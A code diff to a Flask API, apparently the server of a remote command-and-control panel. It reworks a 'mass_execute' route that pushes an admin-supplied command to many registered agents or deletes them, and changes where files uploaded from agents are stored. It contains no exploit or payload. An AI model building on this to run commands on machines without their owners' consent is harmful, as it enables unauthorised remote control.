@@ -1,12 +1,8 @@
-import os
 from datetime import datetime
-from flask import Blueprint, request, abort, url_for, render_template
+from flask import Blueprint, request, abort, url_for, render_template, redirect
 from werkzeug.utils import secure_filename
 from markupsafe import escape
-
-# Import from parent directory
-import sys
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+import os
 
 from models import Agent, Command, db
 from webui import require_admin
@@ -84,7 +80,7 @@ def upload_file(agent_id):
         file = request.files['file']
         filename = secure_filename(file.filename)
         agent_dir = agent.agent_id
-        store_dir = os.path.join('webui/static/uploads', agent_dir)
+        store_dir = os.path.join('static/uploads', agent_dir)
         if not os.path.exists(store_dir):
             os.makedirs(store_dir)
         file_path = os.path.join(store_dir, filename)
@@ -101,13 +97,22 @@ def upload_file(agent_id):
 @api.route('/mass_execute', methods=['POST'])
 @require_admin
 def mass_execute():
-    from flask import redirect, url_for
-    # Handle mass command execution for multiple agents
-    if 'agents' in request.form and 'cmd' in request.form:
-        agent_ids = request.form.getlist('agents')
-        command = request.form['cmd']
-        for agent_id in agent_ids:
+    """Execute commands on multiple agents or delete selected agents"""
+    if 'delete' in request.form:
+        # Delete selected agents
+        selected_agents = request.form.getlist('selection')
+        for agent_id in selected_agents:
             agent = Agent.query.get(agent_id)
             if agent:
-                agent.push_command(command)
+                db.session.delete(agent)
+        db.session.commit()
+    elif 'execute' in request.form and 'cmd' in request.form:
+        # Execute command on selected agents
+        cmd = request.form['cmd']
+        selected_agents = request.form.getlist('selection')
+        for agent_id in selected_agents:
+            agent = Agent.query.get(agent_id)
+            if agent:
+                agent.push_command(cmd)
+    
     return redirect(url_for('webui.agent_list'))
